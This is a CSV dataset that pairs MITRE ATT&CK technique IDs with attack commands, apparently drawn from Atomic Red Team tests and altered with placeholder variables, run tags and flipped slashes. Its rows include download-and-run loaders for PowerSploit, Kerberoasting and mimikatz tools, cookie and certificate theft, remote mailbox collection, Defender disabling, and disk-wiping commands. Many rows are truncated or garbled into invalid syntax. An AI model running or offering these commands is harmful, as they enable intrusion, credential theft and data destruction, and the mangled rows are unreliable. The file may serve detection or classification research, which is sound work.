mitre_id,command
T1610,docker  build  -t  t1610  $pathtoatomicsfolder\t1610\src\  docker  run  --name  t1610_container  --rm  -itd  t1610  bash  \tmp\script.sh# run_7303
T1490,vssadmin resize shadowstorage \for=c: \on=c: \maxsize=20%# run_7378
T1048,"ssh #{domain} ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz# run_1522"
T1505,"install-transportagent -name var_257 get-transportagent | format-list name,enabled"
T1573,$server_ip = var_684
T1571,test-netconnection -computername var_34019
T1542,"echo  ""creating  %systemroot%\wpbbin.exe""  new-item  -itemtype  file  -path  ""$env:systemroot\system32\wpbbin.exe""# run_2489"
T1083,"start-process ""var_81285"" start-sleep -second 4 stop-process -name ""dirlister"""
T1578,gcloud compute snapshots create var_769
T1619,"import-module ""pathtoatomicsfolder\..\externalpayloads\invoke-enumerateazureblobs.ps1"" invoke-enumerateazureblobs -base var_84034"""
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_944"""
T1041,if(-not (test-path var_192 -method post -body $filecontent -disablekeepalive
T1020,"$filename = ""var_915"
T1570,new-smbmapping  -remotepath  'var_680'  'z:\'
T1539,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""var_971""' -e 'set safarifolder to ((path to library folder from user domain as text) & ""containers:com.apple.safari:data:library:cookies:"")' -e 'duplicate file ""cookies.binarycookies"" of folder safarifolder to folder destinationfolderpath with replacing' -e 'end tell'"
T1078,"""pathtoatomicsfolder\..\externalpayloads\psexec.exe""  -accepteula  -s  %comspec%  \c  whoami"
T1485,gcloud config set project var_733
T1219,start-process  var_952
T1496,yes > \dev\null> /dev/null 2>&1 # id_38
T1135,[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  'https:\\raw.githubusercontent.com\powershellmafia\powersploit\f94a5d298a1b4c5dfb1f30a246d9c73d13b22888\recon\powerview.ps1'  -usebasicparsing);  find-domainshare  -checkshareaccess  -verbose; echo 37 > $null
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f> /dev/null 2>&1 # id_21
T1072,"""%programfiles(x86)%\var_35768"""
T1001,"cat ""var_958"" | tail -n 1 | base64 -d | sh"
T1197,"set ""var_238 \eventname:desktopimgdownldr"
T1106,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/namedpipe/namedpipesystem.ps1')
T1552,mkdir var_438 \;
T1137,"copy ""pathtoatomicsfolder\t1137.006\bin\addins\pptvbaaddin.ppam"" ""$env:appdata\microsoft\addins\notepad.ppam"" $ver = (new-object -comobject ""powerpoint.application"").version $excelregpath=""hkcu:\software\microsoft\office\$ver\powerpoint\addins\notepad"" new-item -type directory $excelregpath -force | out-null new-itemproperty $excelregpath ""autoload"" -value ""1"" -propertytype dword | out-null new-itemproperty $excelregpath ""path"" -value ""notepad.ppam"" -propertytype string | out-null stop-process -name ""powerpnt"" -erroraction ignore start-process ""powerpnt""> /dev/null 2>&1 # id_55"
T1578,gcloud compute snapshots create var_48185
T1129,"var_160"""
T1518,ps  aux  |  egrep  'little\  snitch|cbosxsensorservice|falcond|nessusd|santad|cbdefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|blockblock|lulu'> /dev/null 2>&1 # id_49
T1074,curl -s https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1074.001\src\discovery.sh | sh -s > var_78130
T1132,echo -n 111-11-1111 | b64encode -r - curl -xpost var_124
T1119,get-service > $env:temp\t1119_1.txt get-childitem env: > $env:temp\t1119_2.txt get-process > $env:temp\t1119_3.txt> /dev/null 2>&1 # id_83
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_604 write-host ""end of federation configuration."""
T1001,"cd ""pathtoatomicsfolder\externalpayloads\"" import-module .\extract-invoke-psimage.ps1 $extractedscript=extract-invoke-psimage -image ""var_279 $scriptpath = ""$home\textextraction.ps1"" $textmatches -join '' | set-content -path $scriptpath . ""$home\textextraction.ps1"""
T1037,sudo cp var_458 \tmp\t1037_005_agent.plist \library\startupitems\atomic.sh start
T1039,copy \\var_15619
T1529,shutdown \s \t var_94101
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe""  --pipe  4> /dev/null 2>&1 # id_31"
T1505,"$termsrvdll = ""c:\windows\system32\termsrv.dll"" $acl = get-acl $termsrvdll $permission = ""administrators"",""fullcontrol"",""allow"" $accessrule = new-object system.security.accesscontrol.filesystemaccessrule $permission $acl.setaccessrule($accessrule) set-acl -path $termsrvdll -aclobject $acl copy-item -path ""c:\windows\system32\termsrv.dll"" -destination ""c:\windows\system32\termsrv_backup.dll"" -erroraction ignore add-content -path ""c:\windows\system32\termsrv.dll"" -value ""`n"" -nonewline -erroraction ignore move-item -path ""c:\windows\system32\termsrv_backup.dll"" -destination ""c:\windows\system32\termsrv.dll"" -force -erroraction ignore# run_1135"
T1574,"$env:cor_enable_profiling  =  1  $env:cor_profiler  =  'var_53869""'  powershell  -c  'start-sleep  1'"
T1560,mkdir -p var_337
T1055,"start-process ""var_395"" start-sleep -seconds 7 get-process -name notepad -erroraction silentlycontinue | stop-process -force"
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"""
T1649,"$archive=""$env:public\t1649\atomic_certs.zip""  $exfilpath=""$env:public\t1649\certs""  add-type  -assembly  ""system.io.compression.filesystem""  remove-item  $(split-path  $exfilpath)  -recurse  -force  -erroraction  ignore  mkdir  $exfilpath  |  out-null  foreach  ($cert  in  (gci  cert:\currentuser\my))  {  export-certificate  -cert  $cert  -filepath  $exfilpath\$($cert.friendlyname).cer}  [io.compression.zipfile]::createfromdirectory($exfilpath,  $archive)# run_9054"
T1036,"copy %systemroot%\system32\wscript.exe %appdata%\svchost.exe \y cmd.exe \c %appdata%\svchost.exe ""pathtoatomicsfolder\..\externalpayloads\t1036.003\src\t1036.003_masquerading.vbs""# run_7795"
T1114,"$ss = convertto-securestring ""#{password}"" -asplaintext -force $cred = new-object pscredential -argumentlist '#{username}', $ss $param = @{ credential = $cred force = $true } $null = connect-azaccount @param $token = (get-azaccesstoken -resourcetypename msgraph -erroraction stop).token $cert = new-selfsignedcertificate -subject ""cn=powershell application"" -certstorelocation ""cert:\currentuser\my"" -keyexportpolicy exportable -keyspec signature -keylength 2048 -keyalgorithm rsa -hashalgorithm sha256 $reqresourceaccess = ( @{ ""resourceaccess"" = (@{""id""= ""570282fd-fa5c-430d-a7fd-fc8dc98a9dca""; ""type""= ""scope""}, @{ ""id""= ""7427e0e9-2fba-42fe-b0c0-848c9e6a8182""; ""type""= ""scope""}, @{""id""= ""37f7f235-527c-4136-accd-4a02d197296e""; ""type""= ""scope""}, @{""id""= ""14dad69e-099b-42c9-810b-d002981feec1""; ""type""= ""scope""}, @{ ""id""= ""e1fe6dd8-ba31-4d61-89e7-88639da4683d""; ""type""= ""scope""}, @{ ""id""= ""810c84a8-4a9e-49e6-bf7d-12d183f40d01""; ""type""= ""role""}); ""resourceappid"" = ""00000003-0000-0000-c000-000000000000"" }) connect-mggraph -accesstoken $token $context = get-mgcontext $users = get-mguser $app = new-mgapplication -displayname ""t1114.002 atomic test #1 - office365 - remote email collection"" -requiredresourceaccess $reqresourceaccess -web @{ redirecturis=""http://localhost""; } -keycredentials @(@{ type=""asymmetricx509cert""; usage=""verify""; key=$cert.rawdata }) new-mgserviceprincipal -appid $app.appid -additionalproperties @{} | out-null $resourcespn = get-mgserviceprincipal -filter ""appid eq '$($app.appid)'"" $graphapiapp = get-mgserviceprincipal -filter ""displayname eq 'microsoft graph'"" $mailrole = $graphapiapp.approles|where-object value -eq ""mail.read"" new-mgserviceprincipalapproleassignment -serviceprincipalid $resourcespn.id -principalid $resourcespn.id -resourceid $graphapiapp.id -approleid $mailrole.id $mailbox1 = ""#{1st_target_mailbox}"" $mailbox2 = ""#{2nd_target_mailbox}"" $mailbox3 = ""#{3rd_target_mailbox}"" [system.collections.arraylist]$selectusers = @() foreach ($user in $users) {if (($user.mail -eq $mailbox1) -or ($user.mail -eq $mailbox2) -or ($user.mail -eq $mailbox3)){$selectusers.add($user.id)}} connect-mggraph -clientid $app.appid -tenantid $context.tenantid -certificatename $cert.subjectname.name foreach ($user in $selectusers) { $url= ""https://graph.microsoft.com/v1.0/users/$($user)/messages"" ; invoke-mggraphrequest -uri $url -method get -outputtype psobject}"
T1057,tasklist  |  findstr  var_52995
T1482,"dsquery * -filter ""(objectclass=trusteddomain)"" -attr *> /dev/null 2>&1 # id_18"
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe""  --pipe  2> /dev/null 2>&1 # id_59"
T1648,"import-module  ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1""  -force  $access_key  =  ""var_846""  set-awsauthentication  -accesskey  $access_key  -secretkey  $secret_key  -sessiontoken  $session_token  -awsprofile  $aws_profile  -awsregion  $region  invoke-terraform  -terraformcommand  init  -terraformdirectory  ""pathtoatomicsfolder\t1648\src\t1648-1""  invoke-terraform  -terraformcommand  apply  -terraformdirectory  ""pathtoatomicsfolder\t1648\src\t1648-1""  -terraformvariables  @(""profile=t1648-1"",  ""region=$region"")  invoke-lambdaattack  -awsprofile  ""t1648-1""  -awsregion  $region"
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')""> /dev/null 2>&1 # id_11"
T1609,kubectl  create  -f  var_370
T1530,"$storage_account_objects = import-csv -path ""var_40241"
T1496,yes > /dev/null# run_9122
T1622,"#  check  for  common  debugger  processes  $debuggerprocesses  =  get-process  |  where-object  {  $_.processname  -match  ""dbg""  -or  $_.processname  -match  ""debug""  }  #  check  for  debugging  flags  $debuggingflags  =  [system.diagnostics.debugger]::isattached> /dev/null 2>&1 # id_77"
T1555,python3 var_944
T1082,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-sharpwatson.ps1') invoke-watson> /dev/null 2>&1 # id_60
T1571,echo quit | telnet var_8852 exit 0
T1558,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex(iwr https:\\raw.githubusercontent.com\empireproject\empire\08cbd274bef78243d7a8ed6443b8364acd1fc48b\data\module_source\credentials\invoke-kerberoast.ps1 -usebasicparsing) invoke-kerberoast | fl
T1221,"start ""var_50651"""
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)# run_4917"
T1071,"#{curl_path} -s -a ""httpbrowser/1.0"" -m3 #{domain} >nul 2>&1 #{curl_path} -s -a ""wget/1.9+cvs-stable (red hat modified)"" -m3 #{domain} >nul 2>&1 #{curl_path} -s -a ""opera/8.81 (windows nt 6.0; u; en)"" -m3 #{domain} >nul 2>&1 #{curl_path} -s -a ""*<|>*"" -m3 #{domain} >nul 2>&1"
T1113,import -window root #{output_file}# run_2347
T1046,"$ipaddr = ""#{ip_address}"" if ($ipaddr -like ""*,*"") { $ip_list = $ipaddr -split "","" $ip_list = $ip_list.foreach({ $_.trim() }) write-host ""[i] ip address list: $ip_list"" $ports = #{port_list} foreach ($ip in $ip_list) { foreach ($port in $ports) { write-host ""[i] establishing connection to: $ip : $port"" try { $tcp = new-object net.sockets.tcpclient $tcp.connectasync($ip, $port).wait(#{timeout_ms}) | out-null } catch {} if ($tcp.connected) { $tcp.close() write-host ""port $port is open on $ip"" } } } } elseif ($ipaddr -notlike ""*,*"") { if ($ipaddr -eq """") { # assumes the ""primary"" interface is shown at the top $interface = get-netipinterface -addressfamily ipv4 -connectionstate connected | select-object -expandproperty interfacealias -first 1 write-host ""[i] using interface $interface"" $ipaddr = get-netipaddress -addressfamily ipv4 -interfacealias $interface | select-object -expandproperty ipaddress } write-host ""[i] base ip-address for subnet: $ipaddr"" $subnetsubstring = $ipaddr.substring(0, $ipaddr.lastindexof('.') + 1) # always assumes /24 subnet write-host ""[i] assuming /24 subnet. scanning $subnetsubstring'1' to $subnetsubstring'254'"" $ports = #{port_list} $subnetips = 1..254 | foreach-object { ""$subnetsubstring$_"" } foreach ($ip in $subnetips) { foreach ($port in $ports) { try { $tcp = new-object net.sockets.tcpclient $tcp.connectasync($ip, $port).wait(#{timeout_ms}) | out-null } catch {} if ($tcp.connected) { $tcp.close() write-host ""port $port is open on $ip"" } } } } else { write-host ""[error] invalid inputs"" exit 1 }> /dev/null 2>&1 # id_95"
T1005,"osascript  -e  'tell  application  ""finder""'  -e  'set  destinationfolderpath  to  posix  file  ""var_82429  of  notesfolder'  -e  'repeat  with  afile  in  notesfiles'  -e  'duplicate  afile  to  folder  destinationfolderpath  with  replacing'  -e  'end'  -e  'end  tell'"
T1056,"&""$pathtoatomicsfolder\t1056.001\src\get-keystrokes.ps1"" -logpath var_70692"
T1555,security find-certificate -a -p > #{cert_export}> /dev/null 2>&1 # id_16
T1129,"var_264"""
T1619,"try{$response = invoke-webrequest ""https:\\var_218 -append"
T1047,powershell  -exec  bypass  -e  sqbuahyabwbragualqbxag0aaqbnaguadaboag8azaagac0auabhahqaaaagahcaaqbuadmamgbfahaacgbvagmazqbzahmaiaatae4ayqbtaguaiabjahiazqbhahqazqagac0aqqbyagcadqbtaguabgb0aewaaqbzahqaiabuag8adablahaayqbkac4azqb4agua> /dev/null 2>&1 # id_69
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""var_479 -method post -body $cyphertext -disablekeepalive"
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_485"""
T1216,"%systemroot%\system32\syncappvpublishingserver.vbs ""\n;var_931"""
T1564,"echo cmd \c echo ""shell code execution.""> var_37168) do %i"
T1485,cipher.exe  \w:c:
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_70634"""
T1105,rsync -r var_165
T1553,"mount-diskimage -imagepath ""#{path_of_iso}"" -storagetype iso -access readonly $keep = get-volume -filesystemlabel ""testiso"" $driveletter = ($keep | get-volume).driveletter invoke-item ""$($driveletter):\hello.exe""# run_9034"
T1074,"compress-archive -path ""var_369 -force"
T1573,$server_ip = var_585
T1569,"cmd.exe \c ""wmic csproduct get uuid"" cmd.exe \c ""fsutil behavior set symlinkevaluation r2l:1"" cmd.exe \c ""fsutil behavior set symlinkevaluation r2r:1"" reg add hkey_local_machine\system\currentcontrolset\services\lanmanserver\parameters \v maxmpxct \d 16546 \t reg_dword \f copy ""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" $env:temp cmd.exe \c ""$env:temp\psexec.exe -accepteula \\var_42939 cmd.exe \c echo ""--access-token"""""
T1030,cd var_141
T1134,"var_54040"" ""exit"""
T1610,docker  build  -t  t1610  $pathtoatomicsfolder\t1610\src\  docker  run  --name  t1610_container  --rm  -itd  t1610  bash  \tmp\script.sh# run_1315
T1204,"invoke-webrequest #{pua_url} -outfile #{pua_file} & ""#{pua_file}"""
T1486,$which_7z a -pvar_55582
T1048,"import-module ""var_767"
T1140,"mkdir ""var_16519"" -f:* . popd"
T1526,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""var_98473"""
T1018,"net  group  ""domain  computers""  \domain"
T1048,$content = get-content var_235 -method post -body $content
T1221,"start  ""var_934"""
T1071,var_554
T1110,cd  var_691
T1078,gcloud config set project var_20152
T1057,get-process
T1053,"echo ""var_638"
T1098,"$credfile = ""#{cred_file}"" if (test-path $credfile) { $cred = new-object -typename system.management.automation.pscredential -argumentlist $env:username, (get-content $credfile | convertto-securestring) if($cred.getnetworkcredential().password -eq ""#{new_password}""){ write-host -foregroundcolor yellow ""the new password is the same as the password stored in the credential file. please specify a different new password.""; exit -1 } try { $newpassword = convertto-securestring #{new_password} -asplaintext -force set-adaccountpassword -identity $env:username -oldpassword $cred.password -newpassword $newpassword } catch { $_.exception $errcode = $_.exception.errorcode write-host ""error code: $errcode"" if ($errcode -eq 86) { write-host -foregroundcolor yellow ""the stored password for the current user is incorrect. please run the prereq commands to set the correct credentials"" remove-item $credfile } exit $errcode } write-host -foregroundcolor cyan ""successfully changed the password to #{new_password}"" $newcred = new-object system.management.automation.pscredential ($env:username, $(convertto-securestring ""#{new_password}"" -asplaintext -force)) $newcred.password | convertfrom-securestring | out-file $credfile } else { write-host -foregroundcolor yellow ""you must store the password of the current user by running the prerequisite commands first"" }"
T1592,"get-ciminstance  -query  ""select  *  from  win32_pnpentity  where  (pnpclass  =  'image'  or  pnpclass  =  'camera')""# run_3892"
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive\t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }> /dev/null 2>&1 # id_78"
T1074,"compress-archive  -path  ""var_805  -force"
T1127,"copy ""var_174 \t:library %temp%\libhello.js"
T1106,$pathtoatomicsfolder\t1106\bin\x64\syscall.exe  -debug> /dev/null 2>&1 # id_30
T1055,"$address = (& ""$pathtoatomicsfolder\t1055\bin\x64\searchvuln.exe"" ""$pathtoatomicsfolder\t1055\bin\x64\vuln_dll\"" | out-string | select-string -pattern ""virtualaddress: (\w+)"").matches.groups[1].value & ""pathtoatomicsfolder\t1055\bin\x64\rwxinjectionlocal.exe"" ""#{vuln_dll}"" $address# run_5978"
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""> /dev/null 2>&1 # id_51"
T1137,reg.exe add hkcu\software\microsoft\office\var_80913 \f
T1574,dyld_insert_libraries=var_861
T1069,ldifde.exe -f var_27521 -p subtree
T1129,"var_263"""
T1612,docker  build  -t  t1612  $pathtoatomicsfolder\t1612\src\  docker  run  --name  t1612_container  --rm  -d  -t  t1612  docker  exec  t1612_container  .\test.sh# run_1466
T1129,"var_36482"""
T1027,"invoke-webrequest -uri var_243"""
T1221,"start ""var_67524"""
T1526,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-azaccount -credential $credential | out-null get-azdomaininfo -folder #{output_directory} -subscription ""#{subscription_name}"" -verbose"
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""# run_4080"
T1140,"encoded=$(echo 'var_123"""
T1115,"dir  |  clip  echo  ""t1115""  >  %temp%\t1115.txt  clip  <  %temp%\t1115.txt"
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_501"
T1530,"$storage_account_objects = import-csv -path ""var_740"
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""# run_1051"
T1124,net time \\var_7570 w32tm \tz
T1580,aws ec2 describe-security-groups --profile var_764
T1027,"$originalcommand = 'var_678)))"""
T1106,"c:\windows\microsoft.net\framework\v4.0.25731\csc.exe \out:""var_56788"" %tmp%\t1106.exe"
T1098,"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;"
T1207,"#  starting  fake  dc  server,  as  system  (required)  $dc_output_file  =  ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log""  remove-item  $dc_output_file  -erroraction  ignore  $mimikatzparam  =""`""log  $dc_output_file`""  `""lsadump::dcshadow  \object:var_455""  ""lsadump::dcshadow  \push""  ""exit""  write-host  ""`nwaiting  for  fake  dc  server  to  return""  wait-process  $dc  write-host  ""`noutput  from  fake  dc  server:""  get-content  $dc_output_file  start-sleep  1  #  wait  a  little  until  the  file  is  not  locked  anymore  so  we  can  actually  delete  it  remove-item  $dc_output_file  -erroraction  ignore  write-host  ""end  of  dcshadow"""
T1562,"disable-windowsoptionalfeature -online -featurename ""windows-defender-gui"" -norestart -erroraction ignore disable-windowsoptionalfeature -online -featurename ""windows-defender-features"" -norestart -erroraction ignore disable-windowsoptionalfeature -online -featurename ""windows-defender"" -norestart -erroraction ignore disable-windowsoptionalfeature -online -featurename ""windows-defender-applicationguard"" -norestart -erroraction ignore"
T1127,"copy ""var_908 %temp%\hello.js"
T1570,net use * 'var_820' '*:\'
T1021,"echo """" | ""var_838"" ""vim-cmd hostsvc\enable_ssh"""
T1482,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); get-foresttrust -verbose> /dev/null 2>&1 # id_48
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f> /dev/null 2>&1 # id_47
T1497,ping -c var_27404
T1612,docker build -t t1612 $pathtoatomicsfolder\t1612\src\ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container .\test.sh> /dev/null 2>&1 # id_54
T1039,copy \\var_887
T1046,sudo nmap -ss var_893
T1564,"start """" var_719"
T1546,"bash -c 'trap ""nohup sh $pathtoatomicsfolder\t1546.005\src\echo-art-fish.sh"" sigint && kill -sigint $$'"
T1566,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd \c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('var_571"")"
T1217,"find  \  -path  ""*\firefox\profiles\*\places.sqlite""  -exec  echo  {}  >>  var_128  2>\dev\null"
T1090,export var_49420
T1556,"sudo sed -i """" ""var_22589"
T1046,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') fruit -noninteractive -consoleoutput
T1555,"cd ~/library/cookies grep -q ""#{search_string}"" ""cookies.binarycookies"""
T1485,dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes> /dev/null 2>&1 # id_22
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh# run_5798
T1140,"encoded=$(python3 -c 'import base64;enc=base64.b64encode(""var_94524').read());print(dec.decode())"""
T1133,"$extlist = var_360 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1553,certutil  -addstore  my  var_934
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh# run_8666
T1120,fsutil fsinfo drives# run_3386
T1484,"new-itemproperty  ""hklm:\software\policies\microsoft\windows\system""  -name  grouppolicyrefreshtimedc  -propertytype  dword  -value  0  -force  new-itemproperty  ""hklm:\software\policies\microsoft\windows\system""  -name  grouppolicyrefreshtimeoffsetdc  -propertytype  dword  -value  0  -force  new-itemproperty  ""hklm:\software\policies\microsoft\windows\system""  -name  grouppolicyrefreshtime  -propertytype  dword  -value  0  -force  new-itemproperty  ""hklm:\software\policies\microsoft\windows\system""  -name  grouppolicyrefreshtimeoffset  -propertytype  dword  -value  0  -force  new-itemproperty  ""hklm:\software\policies\microsoft\windows\system""  -name  enablesmartscreen  -propertytype  dword  -value  0  -force  new-itemproperty  ""hklm:\software\policies\microsoft\windows\system""  -name  shellsmartscreenlevel  -force# run_9033"
T1620,iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1')  mimiload  -consoleoutput  -noninteractive# run_5892
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f# run_6007
T1136,"connect-azuread $userprincipalname = ""#{userprincipalname}"" $username = ""#{username}"" $password = ""#{password}"" $passwordprofile = new-object -typename microsoft.open.azuread.model.passwordprofile $passwordprofile.password = $password new-azureaduser -displayname $username -passwordprofile $passwordprofile -userprincipalname $userprincipalname -accountenabled $true -mailnickname $username"
T1572,nohup var_90740 >\dev\null 2>&1 &
T1550,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\kevin-robertson\invoke-thehash\01ee90f934313acc7d09560902443c18694ed0eb\invoke-wmiexec.ps1' -usebasicparsing);invoke-wmiexec -target var_927
T1129,"var_782"""
T1543,"echo ""[unit]"" > var_621"
T1123,sh  var_50929
T1202,forfiles \p %systemroot%\system32 \m notepad.exe \c var_67453
T1012,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file var_54128"
T1014,sudo modprobe var_21835
T1546,"reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /f reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /v terminateondesktopswitch /t reg_dword /d 0 /f reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats\malware_test"" /v startexe /t reg_sz /d c:\windows\system32\cmd.exe /f reg add ""hklm\software\microsoft\windows nt\currentversion\accessibility\ats"" /v configuration /t reg_sz /d malware_test /f"
T1518,powershell get-ciminstance -namespace root\securitycenter2 -classname antivirusproduct powershell get-wmiobject -namespace root\securitycenter2 -class antivirusproduct; echo 10 > $null
